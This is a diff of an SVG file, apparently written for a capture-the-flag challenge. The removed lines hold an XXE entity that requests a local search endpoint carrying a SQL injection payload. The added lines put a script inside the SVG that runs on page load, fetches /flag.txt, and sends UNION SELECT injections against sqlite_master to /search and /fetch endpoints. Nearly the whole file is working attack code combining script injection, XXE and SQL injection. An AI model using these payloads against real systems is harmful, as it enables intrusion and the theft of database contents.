@@ -1,8 +1,51 @@
-<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE svg [
-    <!ENTITY xxe SYSTEM "http://127.0.0.1:8001/search?q=') UNION SELECT name, sql FROM sqlite_master WHERE type='table'; --">
-]>
-<svg xmlns="http://www.w3.org/2000/svg" width="1000" height="1000">
-    <rect width="1000" height="1000" fill="white"/>
-    <text x="10" y="50" font-size="12" fill="black">&xxe;</text>
+<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
+  <circle cx="50" cy="50" r="40" stroke="black" stroke-width="3" fill="red"/>
+  <script><![CDATA[
+
+
+   async function tryAllEndpoints() {
+      // 1. First try direct flag.txt
+      try {
+        const flagResp = await fetch('/flag.txt');
+        const flagData = await flagResp.text();
+        alert('Flag.txt response: ' + flagData);
+        if (flagData.includes('nexus{')) {
+          alert('FLAG FOUND in flag.txt: ' + flagData);
+          return;
+        }
+      } catch (e) {
+        alert('Error fetching flag.txt: ' + e.message);
+      }
+      // 2. Try the search endpoint with SQLi
+      try {
+        const sqlQuery = "' UNION SELECT name, sql FROM sqlite_master WHERE type='table' --";
+        const searchResp = await fetch('/search?q=' + encodeURIComponent(sqlQuery));
+        const searchData = await searchResp.text();
+        alert('Search endpoint response length: ' + searchData.length);
+        if (searchData.includes('_') && searchData.includes('flag_')) {
+          alert('Found promising data in search response!');
+        }
+      } catch (e) {
+        alert('Error with search endpoint: ' + e.message);
+      }
+      // 3. Try the fetch endpoint
+      try {
+        const params = new URLSearchParams();
+        params.append('q', "' UNION SELECT name, sql FROM sqlite_master WHERE type='table' --");
+        const fetchResp = await fetch('/fetch', {
+          method: 'POST',
+          body: params
+        });
+        const fetchData = await fetchResp.text();
+        alert('Fetch endpoint response length: ' + fetchData.length);
+        if (fetchData.includes('_') && fetchData.includes('flag_')) {
+          alert('Found promising data in fetch response!');
+        }
+      } catch (e) {
+        alert('Error with fetch endpoint: ' + e.message);
+      }
+    }
+    tryAllEndpoints();
+    
+  ]]></script>
 </svg>
